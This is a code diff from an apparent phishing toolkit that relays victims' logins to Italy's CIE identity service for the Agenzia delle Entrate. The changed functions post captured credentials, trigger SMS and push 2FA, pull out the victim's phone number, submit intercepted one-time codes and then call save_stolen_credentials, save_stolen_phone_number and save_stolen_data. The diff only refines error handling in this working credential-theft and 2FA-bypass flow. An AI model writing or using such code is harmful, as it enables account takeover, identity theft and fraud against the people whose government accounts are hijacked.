@@ -1,5 +1,5 @@
 from .client import execute_access_flow, access_again_login_page, post_credentials, contact_user_phone, submit_push_2fa_sms, get_2fa_status, submit_push_2fa, get_qr_code_status, submit_scanned_qr_code, confirm_access
-from .parser import extract_qr_code, extract_login_errors, extract_phone_number
+from .parser import extract_qr_code, extract_errors, extract_phone_number
 from ..flow import LoginFlow
 from ..utils.writer import save_stolen_credentials, save_stolen_phone_number, save_stolen_data
 
@@ -31,7 +31,7 @@ def submit_credentials(login_flow: LoginFlow, credentials: dict) -> dict | None:
     post_credentials(login_flow, credentials)
 
     # Check for login errors
-    error = extract_login_errors(login_flow.response.text)
+    error = extract_errors(login_flow.response.text)
 
     return error
 
@@ -42,7 +42,7 @@ def send_2fa_notification(login_flow: LoginFlow) -> None:
 def send_2fa_sms(login_flow: LoginFlow) -> None:
     """Sends the 2FA SMS to the CIE login page"""
     contact_user_phone(login_flow, "sms")
-    login_flow.phone_number = extract_phone_number(login_flow)
+    login_flow.phone_number = extract_phone_number(login_flow.response.text)
     save_stolen_phone_number(login_flow)
 
 def send_2fa_sms_notification(login_flow: LoginFlow) -> None:
@@ -52,10 +52,10 @@ def send_2fa_sms_notification(login_flow: LoginFlow) -> None:
 def retrieve_access_after_push_2fa_sms(login_flow: LoginFlow, otp1: str, otp2: str, otp3: str, otp4: str) -> dict | None:
     """Retrieves the access to the Service Provider (Agenzia delle Entrate) after the 2FA has been confirmed via SMS"""
     submit_push_2fa_sms(login_flow, otp1, otp2, otp3, otp4)
-    try:
-        confirm_access(login_flow)
-    except Exception:
-        return {"error": "Invalid OTP"}
+    error = extract_errors(login_flow.response.text)
+    if error is not None:
+        return error
+    confirm_access(login_flow)
     save_stolen_data(login_flow)
 
 def check_2fa(login_flow: LoginFlow) -> dict:
